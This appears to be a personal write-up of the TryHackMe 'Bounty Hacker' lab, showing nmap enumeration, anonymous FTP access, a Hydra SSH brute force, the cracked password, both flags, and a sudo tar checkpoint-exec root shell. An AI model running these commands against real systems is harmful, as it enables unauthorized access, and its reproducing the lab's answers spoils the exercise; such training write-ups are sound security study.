@@ -1,0 +1,166 @@
+# Bounty Hacker — TryHackMe Writeup
+
+## Overview
+
+This machine focuses on:
+
+- Enumeration of services
+- Credential discovery via FTP
+- Brute force using a targeted wordlist
+- Privilege escalation via SUDO misconfiguration
+
+The goal was to gain **root access**.
+
+## Overview of the Task for this Machine
+
+![[Pasted image 20260325161454.png]]
+
+
+# 1. Enumeration
+
+##  Nmap Scan
+
+nmap -sC -sV -p- <target-ip>
+
+### Findings:
+
+- **21 → FTP (anonymous login allowed)**
+- **22 → SSH**
+- **80 → HTTP**
+
+---
+
+##  Analysis
+
+The key finding was:  
+Anonymous FTP access
+
+This suggests:
+
+- Weak authentication
+- Possible exposure of sensitive files
+
+ FTP becomes the primary attack vector
+![[Pasted image 20260325162516.png]]
+
+
+ FTP Access
+
+ftp <target-ip>
+
+Logged in using:
+
+anonymous / anonymous
+
+Inside, I found:
+
+- `task.txt`
+- `locks.txt`
+
+---
+
+## What I found
+
+### task.txt
+
+This file gave a username:
+
+lin
+
+### locks.txt
+
+This looked like a list of possible passwords.
+
+At this point, instead of guessing randomly, I had:
+
+- username → lin
+- password list → locks.txt
+
+So it made sense to try brute forcing SSH.
+
+Who wrote the task list?
+
+![[Pasted image 20260325163237.png]]
+
+![[Pasted image 20260325163334.png]]
+Answer - lin
+
+What service can you bruteforce with the text file found?
+ssh
+
+# What is the users password?
+
+## Brute Force (Hydra)
+
+hydra -l lin -P locks.txt ssh://<target-ip> -t 4
+
+
+![[Pasted image 20260325165340.png]]
+![[Pasted image 20260325165400.png]]
+Seems like a Password list , lets use Hydra to Brute force 
+
+![[Pasted image 20260325165447.png]]
+Yes, we found we found the password Hydra was able to brute force it 
+Now lets login!!
+Answer - RedDr4gonSynd1cat3
+
+# user.txt
+
+## SSH Access
+
+ssh lin@<target-ip>
+
+Logged in successfully.
+
+## User Flag
+
+cat user.txt
+
+![[Pasted image 20260325165532.png]]
+
+![[Pasted image 20260325165722.png]]
+Found the Flag- THM{CR1M3_SyNd1C4T3}
+
+# root.txt
+## Privilege Escalation
+
+Next step was to check sudo permissions:
+
+sudo -l
+
+Output showed:
+
+(root) /bin/tar
+
+This means I can run `tar` as root without a password.
+
+
+
+## Exploiting tar
+
+I knew that `tar` can be abused to execute commands, so I used:
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+This gave me a root shell.
+
+---
+
+## Root Flag
+
+cat /root/root.txt
+
+THM{80UN7Y_h4cK3r}
+
+![[Pasted image 20260325170406.png]]
+
+## 🧠 Overview
+
+This machine focuses on:
+
+- Enumeration of services
+- Credential discovery via FTP
+- Brute force using a targeted wordlist
+- Privilege escalation via SUDO misconfiguration
+
+
